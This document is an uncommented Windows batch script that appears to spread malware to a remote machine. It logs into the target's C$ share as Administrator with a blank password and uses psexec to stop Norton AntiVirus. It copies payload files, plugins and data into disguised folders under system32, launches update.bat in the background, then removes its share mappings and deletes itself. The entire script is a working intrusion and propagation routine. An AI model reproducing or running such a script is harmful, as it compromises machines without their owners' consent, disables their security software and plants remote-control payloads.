net use p: /delete
net use \\24.65.23.182 /USER:Administrator
net use p: \\24.65.23.182\C$
psexec \\24.65.23.182 -u Administrator -p "" net stop "Norton AntiVirus Server"
psexec \\24.65.23.182 -u Administrator -p "" -c temp.bat
mkdir p:\winnt\system32\rmtcfg
mkdir p:\winnt\system32\catroot
copy copy\* p:\winnt\system32\rmtcfg
mkdir p:\winnt\system32\rmtcfg\files
mkdir p:\winnt\system32\rmtcfg\files\copy
mkdir p:\winnt\system32\rmtcfg\files\dat
mkdir p:\winnt\system32\rmtcfg\files\log
mkdir p:\winnt\system32\rmtcfg\files\plugin
copy C:\WINNT\SYSTEM32\RMTCFG\files\* p:\winnt\system32\rmtcfg\files
copy copy\* p:\winnt\system32\rmtcfg\files\copy
copy plugin\* p:\winnt\system32\rmtcfg\files\plugin
copy dat\* p:\winnt\system32\rmtcfg\files\dat
psexec \\24.65.23.182 -u Administrator -p "" -d c:\winnt\system32\rmtcfg\update.bat
net use p: /delete
net use \\24.65.23.182 /delete
del runme279772.bat
